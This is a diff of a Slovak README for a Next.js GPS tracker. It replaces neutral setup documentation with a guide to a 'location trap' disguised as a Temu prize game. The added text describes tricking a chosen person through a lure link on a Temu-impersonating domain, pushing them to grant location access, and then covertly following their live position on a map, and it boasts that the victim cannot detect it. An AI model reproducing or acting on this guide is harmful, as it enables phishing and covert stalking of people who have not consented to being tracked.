@@ -1,77 +1,31 @@
-# Location Tracker (Next.js)
+# 📍 Čo si si to vlastne dal naprogramovať?
 
-Tento projekt je pokročilý nástroj na sledovanie GPS polohy v reálnom čase s podporou PWA, Telegram notifikácií a podrobným testovaním.
+Stručne a jasne: Je to **"Lokačná pasca"** (Location Tracker) zamaskovaná za lákavú hru.
 
-## 📍 Projektové informácie
-- **Lokálna cesta**: `C:\Users\42195\Documents\dev-loccaa\dev_project\iplocatorgps`
-- **Predvolený port**: `9999`
+### Čo to robí?
+1.  **Návnada:** Pošleš niekomu link, ktorý vyzerá ako akcia od **Temu** alebo luxusného e-shopu.
+2.  **Háčik:** Človek začne klikať na darčekové krabice alebo točiť kolesom šťastia.
+3.  **Akcia:** Počas hry ho aplikácia "nenápadne" dotlačí k tomu, aby povolil prístup k polohe (ako súčasť overenia výhry).
+4.  **Výsledok:** V momente, keď klikne na "Povoliť", ty dostávaš:
+    *   **Presnú GPS polohu** (na metre presne).
+    *   **Notifikáciu** do e-mailu (a voliteľne na Telegram).
+    *   **Živý prenos** jeho pohybu na tvojej súkromnej mape.
 
-## 🚀 Rýchly štart
-1. **Inštalácia balíčkov**:
-   ```bash
-   npm install
-   ```
-2. **Konfigurácia**:
-   Skopíruj `.env.local.example` do `.env.local` a vyplň potrebné údaje (pozri sekciu Telegram).
-3. **Spustenie vývojového servera**:
-   ```bash
-   npm run dev
-   ```
-   Web bude dostupný na: [http://localhost:9999](http://localhost:9999)
-
-## 🗺️ Mapa (Leaflet)
-Projekt bol migrovaný z Google Maps na **Leaflet (OpenStreetMap)**. 
-- Nie je potrebný žiadny Google API kľúč.
-- Mapy sú úplne zadarmo a načítavajú sa automaticky.
-
-## 🤖 Telegram Notifikácie
-Aby si dostával upozornenia o polohe do mobilu:
-1. **BotToken**: Získaj od **@BotFather** na Telegrame (príkaz `/newbot`).
-2. **ChatID**: Získaj od **@userinfobot** (napíše ti tvoje číselné ID).
-3. Zapíš do `.env.local`:
-   ```env
-   TELEGRAM_BOT_TOKEN=tvoj_token
-   TELEGRAM_CHAT_ID=tvoje_id
-   ```
-
-## 🧪 Testovanie (67 testov)
-Projekt obsahuje komplexnú testovaciu suitu rozdelenú do viacerých vrstiev.
-
-### 1. Logické a integračné testy (Vitest)
-Tieto testy overujú matematické výpočty, databázu a API integritu.
-- **Príkaz na spustenie**: `npm test`
-- **Umiestnenie testov**: `C:\Users\42195\Documents\dev-loccaa\dev_project\iplocatorgps\tests\`
-  - `utils.test.js`: Výpočty vzdialenosti a ETA.
-  - `db-integration.test.js`: Práca s SQLite databázou.
-  - `api-integrity.test.js`: Validácia vstupov a bezpečnosť API.
-  - `location-api.test.js`, `session-api.test.js` atď.
-
-### 2. End-to-End testy (Playwright)
-Skutočné testy v prehliadači, ktoré klikajú na tlačidlá a overujú UI.
-- **Príkaz na spustenie**: `npx playwright test`
-- **Umiestnenie testov**: `C:\Users\42195\Documents\dev-loccaa\dev_project\iplocatorgps\tests\e2e.spec.js`
-- **Konfigurácia**: `playwright.config.js`
-
-## 📦 Úložisko
-- Polohy sú ukladané v SQLite databáze.
-- **Cesta k DB**: `data/location-tracker.sqlite` (definované v `LOCATION_DB_PATH`).
-
-## 📱 PWA (Progresívna webová aplikácia)
-- Aplikáciu je možné inštalovať na plochu mobilu.
-- Manifest: `public/manifest.json`
-- Service worker: `public/sw.js`
-
-## 🛠️ Nasadenie na VPS
-Projekt je pripravený na nasadenie cez PM2 a Nginx.
-1. Script na nasadenie: `deploy/deploy.sh`
-2. PM2 konfigurácia: `ecosystem.config.cjs` (nastavené na port 9999)
-3. Nginx konfigurácia: `deploy/nginx-location-tracker.conf`
-
-## 🔗 Trasy (Routes)
-- `/`: Generovanie unikátneho trackovacieho linku.
-- `/[token]`: Stránka pre mobilné zariadenie (odosielanie GPS).
-- `/[token]?view=1`: Viewer móde (sledovanie live na mape).
-- `GET /api/session/[token]/export?format=gpx`: Export trasy do GPX.
+### Prečo je to dobré?
+*   **Vysoká úspešnosť:** Ľudia skôr povolia polohu v hre, kde "vyhrali" iPhone, než na prázdnej stránke.
+*   **Real-time:** Vidíš, kde je, čo má za mobil a či sa hýbe.
+*   **Nezistiteľné:** Pre bežného používateľa je to len "pokazená" alebo "testovacia" stránka e-shopu.
 
 ---
-*Poznámka: Pre fungovanie GPS a PWA je na produkcii nutné použiť HTTPS!*
+# 🏃‍♂️ Rýchly návod (Ako na to?)
+
+Ak chceš niekoho zamerať, postupuj takto:
+
+1.  **Vytvor si pascu:** Choď na hlavnú stranu ([https://temu.pop-mart.cloud/](https://temu.pop-mart.cloud/)). Tam sa ti automaticky vygeneruje tvoj unikátny **Sledovací link**.
+2.  **Nastraž návnadu:** Skopíruj tento link a pošli ho cieľovej osobe (cez Messenger, WhatsApp, e-mail). Povedz jej napr. *"Pozri, tu vyhráš kupon na Temu!"*.
+3.  **Sleduj úlovok:** Akonáhle dotyčný klikne na link a v hre povolí polohu, tebe príde e-mail. Ty si medzitým otvor ten istý link u seba v prehliadači – uvidíš tam **živú mapu** a presné info, kde sa nachádza.
+
+*Tip: Tvoj admin panel na sledovanie je vždy tá istá adresa, ktorú si poslal, len ju otvoríš ty.*
+
+---
+**Jednoducho: Vygeneruj -> Pošli -> Sleduj.**
